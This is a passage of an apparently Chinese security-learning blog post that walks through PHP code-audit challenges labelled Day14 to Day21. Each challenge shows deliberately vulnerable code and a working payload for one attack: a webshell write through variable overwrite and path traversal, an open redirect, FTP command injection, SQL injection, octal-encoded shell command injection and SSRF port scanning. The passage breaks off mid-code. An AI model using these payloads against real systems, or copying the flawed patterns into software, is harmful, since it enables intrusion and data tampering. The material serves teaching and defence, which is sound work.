<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($input)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;id = rand(<span class="number">1</span>, <span class="number">1000</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">foreach</span> ($input <span class="keyword">as</span> $field =&gt; $count) &#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;$field = $count++;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        file_put_contents(</span><br><span class="line">            <span class="keyword">self</span>::EXTERNAL_DIRECTORY . <span class="keyword">$this</span>-&gt;id,</span><br><span class="line">            var_export(get_object_vars(<span class="keyword">$this</span>), <span class="keyword">true</span>)</span><br><span class="line">        );</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$carrot = <span class="keyword">new</span> Carrot($_GET);</span><br><span class="line">show_source(<span class="keyword">__FILE__</span>);</span><br></pre></td></tr></table></figure><p>看到<strong>file_put_contents</strong>函数，猜测考察写入<strong>webshell</strong>，foreach函数存在变量覆盖：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">foreach ($input as $field =&gt; $count) &#123;</span><br><span class="line">            $this-&gt;$field = $count++;</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure><p><code>$this-&gt;$field = $count++;</code>中的<code>++</code>是后增，不会影响，所以我们可以通过此函数覆盖变量<strong>$id</strong>，控制写入的文件名和位置：<code>id=../../var/www/html/info.php</code></p><p>再观察写入的内容，经过两个函数<strong>get_object_vars</strong>和<strong>var_export</strong>的处理，先看看这两个函数的作用：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">get_object_vars — 返回由对象属性组成的关联数组</span><br><span class="line">var_export — 输出或返回一个变量的字符串表示</span><br></pre></td></tr></table></figure><p>var_export与var_dump区别在于var_export输出的是合法的PHP代码，那么我们就可以写入合法的PHP代码</p><p>最终的Payload如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=../../var/www/html/info.php&amp;a=&lt;?php phpinfo(); ?&gt;</span><br></pre></td></tr></table></figure><p>最终写入的内容是：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">array (</span><br><span class="line">&apos;id&apos; =&gt; &apos;../../var/www/html/test/shell.php&apos;,</span><br><span class="line">&apos;lost&apos; =&gt; 0,</span><br><span class="line">&apos;bought&apos; =&gt; 0,</span><br><span class="line">&apos;a&apos; =&gt; &apos;&lt;?php phpinfo()?&gt;&apos;</span><br><span class="line">)</span><br></pre></td></tr></table></figure><h2 id="Day15"><a href="#Day15" class="headerlink" title="Day15"></a>Day15</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Redirect</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> $websiteHost = <span class="string">'www.vulnspy.com'</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">setHeaders</span><span class="params">($url)</span> </span>&#123;</span><br><span class="line">        $url = urldecode($url);</span><br><span class="line">        header(<span class="string">"Location: $url"</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">startRedirect</span><span class="params">($params)</span> </span>&#123;</span><br><span class="line">        $parts = explode(<span class="string">'/'</span>, $_SERVER[<span class="string">'PHP_SELF'</span>]);</span><br><span class="line">        print_r($parts);</span><br><span class="line">        $baseFile = end($parts);</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">'$baseFile = '</span>.$baseFile.<span class="string">"&lt;br&gt;"</span>;</span><br><span class="line">        $url = sprintf(</span><br><span class="line">            <span class="string">"%s?%s"</span>,</span><br><span class="line">            $baseFile,</span><br><span class="line">            http_build_query($params)</span><br><span class="line">        );</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">'$url = '</span>.$url.<span class="string">"&lt;br&gt;"</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;setHeaders($url);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> ($_GET[<span class="string">'redirect'</span>]) &#123;</span><br><span class="line">    (<span class="keyword">new</span> Redirect())-&gt;startRedirect($_GET[<span class="string">'params'</span>]);</span><br><span class="line">&#125;</span><br><span class="line">show_source(<span class="keyword">__FILE__</span>);</span><br></pre></td></tr></table></figure><p>这题考察的是<strong>任意路径跳转</strong>，跳转的路径来源于<code>$_SERVER[&#39;PHP_SELF&#39;]</code>，这个全局变量含义是当前执行脚本在服务器下的路径，再通过<code>explode</code>函数将路径以<code>/</code>为分隔符分隔成一个数组，通过<code>end</code>函数将数组最后一个元素取出拼接上参数<code>$params</code>，再经过<code>urldecode</code>函数进行一次URL解码后作为重定向的url</p><p>假想我们要跳转到百度页面，访问<code>http://127.0.0.1/html/day15.php/https://www.baidu.com?redirect=1</code>，那么经过处理后的跳转的应该是<code>Location: www.baidu.com</code>，还是站内页面。我们要跳转到站外，就必须要加上<code>http</code>，所以，我们就可以利用题目中的一次URL解码加上本身浏览器对GET就有一次URL解码，对<code>//</code>进行<strong>二次URL编码</strong>，编码后为<code>%25%32%66%25%32%66</code>，那么payload就为：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/html/day15.php/https:%25%32%66%25%32%66www.baidu.com?redirect=1</span><br></pre></td></tr></table></figure><p>最后跳转的为：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Location: https://www.baidu.com?</span><br></pre></td></tr></table></figure><p>就成功跳转到百度页面</p><h2 id="Day16"><a href="#Day16" class="headerlink" title="Day16"></a>Day16</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">FTP</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $sock;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($host, $port, $user, $pass)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;sock = fsockopen($host, $port);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">$this</span>-&gt;login($user, $pass);</span><br><span class="line">        <span class="keyword">$this</span>-&gt;cleanInput();</span><br><span class="line">        <span class="keyword">$this</span>-&gt;mode($_REQUEST[<span class="string">'mode'</span>]);</span><br><span class="line">        <span class="keyword">$this</span>-&gt;send($_FILES[<span class="string">'file'</span>]);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">cleanInput</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        $_GET = array_map(<span class="string">'intval'</span>, $_GET);</span><br><span class="line">        $_POST = array_map(<span class="string">'intval'</span>, $_POST);</span><br><span class="line">        $_COOKIE = array_map(<span class="string">'intval'</span>, $_COOKIE);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">login</span><span class="params">($username, $password)</span> </span>&#123;</span><br><span class="line">        fwrite(<span class="keyword">$this</span>-&gt;sock, <span class="string">"USER "</span> . $username . <span class="string">"\n"</span>);</span><br><span class="line">        fwrite(<span class="keyword">$this</span>-&gt;sock, <span class="string">"PASS "</span> . $password . <span class="string">"\n"</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">mode</span><span class="params">($mode)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> ($mode == <span class="number">1</span> || $mode == <span class="number">2</span> || $mode == <span class="number">3</span>) &#123;</span><br><span class="line">            fputs(<span class="keyword">$this</span>-&gt;sock, <span class="string">"MODE $mode\n"</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">send</span><span class="params">($data)</span> </span>&#123;</span><br><span class="line">        fputs(<span class="keyword">$this</span>-&gt;sock, $data);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">new</span> FTP(<span class="string">'localhost'</span>, <span class="number">21</span>, <span class="string">'user'</span>, <span class="string">'password'</span>);</span><br><span class="line">show_source(<span class="keyword">__FILE__</span>);</span><br></pre></td></tr></table></figure><p>这题的漏洞在于<code>$this-&gt;mode($_REQUEST[&#39;mode&#39;]);</code>和<code>==</code></p><p>首先，我们知道全局变量<code>$_REQUEST[]</code>是取值于<code>$_GET</code>，<code>$_POST</code>和<code>$_COOKIE</code>，即当三个全局变量一旦有赋值，<code>$_REQUEST</code>就被赋值，后面值不会再因为它们三个全局变量改变而改变，举个例子：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$_GET = array_map(&apos;intval&apos;,$_GET);</span><br><span class="line">var_dump($_GET);</span><br><span class="line">var_dump($_REQUEST);</span><br></pre></td></tr></table></figure><p>最后输出的是：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">array(1) &#123; [&quot;a&quot;]=&gt; int(1) &#125; </span><br><span class="line">array(1) &#123; [&quot;a&quot;]=&gt; string(4) &quot;1abc&quot; &#125;</span><br></pre></td></tr></table></figure><p>第二，<code>==</code>在PHP中是<strong>弱类型比较</strong>，即<code>1 == &#39;1a&#39;</code>，所以最后的payload为：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?mode=1%0a%0dDELETE%20test.file</span><br></pre></td></tr></table></figure><p>就可以利用ftp协议来删除文件了</p><h2 id="Day17"><a href="#Day17" class="headerlink" title="Day17"></a>Day17</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">require_once</span> <span class="string">"bootstrap.php"</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>($_POST == <span class="keyword">false</span>)&#123;</span><br><span class="line">show_source(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">exit</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">RealSecureLoginManager</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> $em;</span><br><span class="line">    <span class="keyword">private</span> $user;</span><br><span class="line">    <span class="keyword">private</span> $password;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($user, $password)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;em = DoctrineManager::getEntityManager();</span><br><span class="line">        <span class="keyword">$this</span>-&gt;user = $user;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;password = $password;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">isValid</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        $pass = md5(<span class="keyword">$this</span>-&gt;password, <span class="keyword">true</span>);</span><br><span class="line">        $user = <span class="keyword">$this</span>-&gt;sanitizeInput(<span class="keyword">$this</span>-&gt;user);</span><br><span class="line"></span><br><span class="line">        $queryBuilder = <span class="keyword">$this</span>-&gt;em-&gt;createQueryBuilder()</span><br><span class="line">            -&gt;select(<span class="string">"COUNT(u)"</span>)</span><br><span class="line">            -&gt;from(<span class="string">"User"</span>, <span class="string">"u"</span>)</span><br><span class="line">            -&gt;where(<span class="string">"u.password = '$pass' AND u.user = '$user'"</span>);</span><br><span class="line">        $query = $queryBuilder-&gt;getQuery();</span><br><span class="line">        <span class="keyword">return</span> boolval($query-&gt;getSingleScalarResult());</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">sanitizeInput</span><span class="params">($input)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> addslashes($input);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$auth = <span class="keyword">new</span> RealSecureLoginManager(</span><br><span class="line">    $_POST[<span class="string">'user'</span>],</span><br><span class="line">    $_POST[<span class="string">'passwd'</span>]</span><br><span class="line">);</span><br><span class="line"><span class="keyword">if</span> (!$auth-&gt;isValid()) &#123;</span><br><span class="line">    <span class="keyword">exit</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="string">'Hello, '</span>.$_POST[<span class="string">'user'</span>];</span><br></pre></td></tr></table></figure><p>这题看起来是Day13的升级版，那题我们是利用<strong>addslashes</strong>和字符串截断进行<code>\</code>逃逸，从而进行SQL注入。这题对$pass进行了md5加密，但这里我们注意到md5函数中加入了参数<strong>true</strong>，我们可以测试一下：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">var_dump(md5(<span class="number">1</span>));</span><br><span class="line">var_dump(md5(<span class="number">1</span>,<span class="keyword">true</span>));</span><br></pre></td></tr></table></figure><p>输出的是：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">string(32) &quot;c4ca4238a0b923820dcc509a6f75849b&quot; </span><br><span class="line">string(16) &quot;��B8��#� �P�ou��&quot;</span><br></pre></td></tr></table></figure><p>看出加入true参数后与原来输出是有区别的，那么我们可以进行<strong>fuzz</strong>测试，看看有没有md5处理后最后一个字符为<code>\</code></p><p>测试代码如下：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span>($i=<span class="number">1</span>;$i++;)&#123;</span><br><span class="line">$key = md5($i,<span class="keyword">true</span>);</span><br><span class="line"><span class="keyword">if</span>(substr($key,strlen($key)<span class="number">-1</span>,<span class="number">1</span>) == <span class="string">'\\'</span>)&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">'$i = '</span>.$i.<span class="string">' $key = '</span>.$key;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>结果为：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$i = 128 $key = v�an���l���q��\</span><br></pre></td></tr></table></figure><p>所以我们就可以构造payload：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pass=128&amp;user=&apos; or 1=1#</span><br></pre></td></tr></table></figure><p>从而进行SQL注入</p><h2 id="Day18"><a href="#Day18" class="headerlink" title="Day18"></a>Day18</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">JWT</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">verifyToken</span><span class="params">($data, $signature)</span> </span>&#123;</span><br><span class="line">        $pub = openssl_pkey_get_public(<span class="string">"file://pub_key.pem"</span>);</span><br><span class="line">        $signature = base64_decode($signature);</span><br><span class="line">        <span class="keyword">if</span> (openssl_verify($data, $signature, $pub)) &#123;</span><br><span class="line">            $object = json_decode(base64_decode($data));</span><br><span class="line">            <span class="keyword">$this</span>-&gt;loginAsUser($object);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">(<span class="keyword">new</span> JWT())-&gt;verifyToken($_GET[<span class="string">'d'</span>], $_GET[<span class="string">'s'</span>]);</span><br><span class="line">show_source(<span class="keyword">__FILE__</span>);</span><br></pre></td></tr></table></figure><p>这题没怎么看懂，大致是利用<code>openssl_verify</code>遇到错误时会返回-1，而if语句只有判断为0和false才不会执行。</p><h2 id="Day19"><a href="#Day19" class="headerlink" title="Day19"></a>Day19</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ImageViewer</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> $file;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($file)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;file = <span class="string">"images/$file"</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;createThumbnail();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">createThumbnail</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        $e = stripcslashes(</span><br><span class="line">            preg_replace(</span><br><span class="line">                <span class="string">'/[^0-9\\\]/'</span>,</span><br><span class="line">                <span class="string">''</span>,</span><br><span class="line">                <span class="keyword">isset</span>($_GET[<span class="string">'size'</span>]) ? $_GET[<span class="string">'size'</span>] : <span class="string">'25'</span></span><br><span class="line">            )</span><br><span class="line">        );</span><br><span class="line">        system(<span class="string">"/usr/bin/convert &#123;$this-&gt;file&#125; --resize $e</span></span><br><span class="line"><span class="string">                ./thumbs/&#123;$this-&gt;file&#125;"</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__toString</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">"&lt;a href=&#123;$this-&gt;file&#125;&gt;</span></span><br><span class="line"><span class="string">                &lt;img src=./thumbs/&#123;$this-&gt;file&#125;&gt;&lt;/a&gt;"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> (<span class="keyword">new</span> ImageViewer(<span class="string">"image.png"</span>));</span><br><span class="line">show_source(<span class="keyword">__FILE__</span>);</span><br></pre></td></tr></table></figure><p>这题关键在于<code>stripcslashes</code>函数，它能返回反转义后的字符串。可识别类似 C 语言的 <em>\n</em>，<em>\r</em>，… 八进制以及十六进制的描述。</p><p>而下面的正则匹配过滤过滤掉除了<code>0-9</code>和反斜杠<code>\</code>，所以我们可以将我们要执行的命令转化为八进制，这样就可以构成任意命令执行的漏洞</p><p>例如执行sleep命令，将<code>0;sleep 5;</code>转化为八进制为<code>0\073\163\154\145\145\160\0405\073</code></p><p>payload：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?size=0\073\163\154\145\145\160\0405\073</span><br></pre></td></tr></table></figure><h2 id="Day20"><a href="#Day20" class="headerlink" title="Day20"></a>Day20</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>($_GET) || $_GET == <span class="keyword">false</span>)&#123;</span><br><span class="line">show_source(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">exit</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">set_error_handler(<span class="function"><span class="keyword">function</span> <span class="params">($no, $str, $file, $line)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">throw</span> <span class="keyword">new</span> ErrorException($str, <span class="number">0</span>, $no, $file, $line);</span><br><span class="line">&#125;, E_ALL);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ImageLoader</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getResult</span><span class="params">($uri)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (!filter_var($uri, FILTER_VALIDATE_URL)) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="string">'&lt;p&gt;Please enter valid uri&lt;/p&gt;'</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            $image = file_get_contents($uri);</span><br><span class="line">            $path = <span class="string">"./images/"</span> . uniqid() . <span class="string">'.jpg'</span>;</span><br><span class="line">            file_put_contents($path, $image);</span><br><span class="line">            <span class="keyword">if</span> (mime_content_type($path) !== <span class="string">'image/jpeg'</span>) &#123;</span><br><span class="line">                unlink($path);</span><br><span class="line">                <span class="keyword">return</span> <span class="string">'&lt;p&gt;Only .jpg files allowed&lt;/p&gt;'</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (<span class="keyword">Exception</span> $e) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="string">'&lt;p&gt;There was an error: '</span> .</span><br><span class="line">                $e-&gt;getMessage() . <span class="string">'&lt;/p&gt;'</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="string">'&lt;img src="'</span> . $path . <span class="string">'" width="100"/&gt;'</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> (<span class="keyword">new</span> ImageLoader())-&gt;getResult($_GET[<span class="string">'img'</span>]);</span><br></pre></td></tr></table></figure><p>这关考察的是利用<code>file_get_contents</code>函数通过<code>set_error_handler</code>产生报错信息来产生SSRF，我们可以通过SSRF来检测内部服务是否开启，例如输入payload为：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?img=http://127.0.0.1:22</span><br></pre></td></tr></table></figure><p>如果响应结果为：<code>There was an error: file_get_contents(http://127.0.0.1:22): failed to open stream: HTTP request failed! SSH-2.0-OpenSSH_7.2p2 Ubuntu-4ubuntu2.2</code>则说明存在SSH服务</p><p>如果检测一个不存在端口<code>?img=http://127.0.0.1:30</code>，则响应<code>There was an error: file_get_contents(http://127.0.0.1:30): failed to open stream: Connection refused</code>，说明服务不存在</p><h2 id="Day21"><a href="#Day21" class="headerlink" title="Day21"></a>Day21</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">declare</span>(strict_types=<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ParamExtractor</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> $validIndices = [];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">indices</span><span class="params">($input)</span> </span>&#123;</span><br><span class="line">        $validate = <span class="function"><span class="keyword">function</span> <span class="params">(int $value, $key)</span> </span>&#123;</span><br><span class="line">            <span class="keyword">if</span> ($value &gt; <span class="number">0</span>) &#123;</span><br><span class="line">                <span class="keyword">$this</span>-&gt;validIndices[] = $key;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            array_walk($input, $validate, <span class="number">0</span>);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (TypeError $error) &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">"Only numbers are allowed as input"</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span 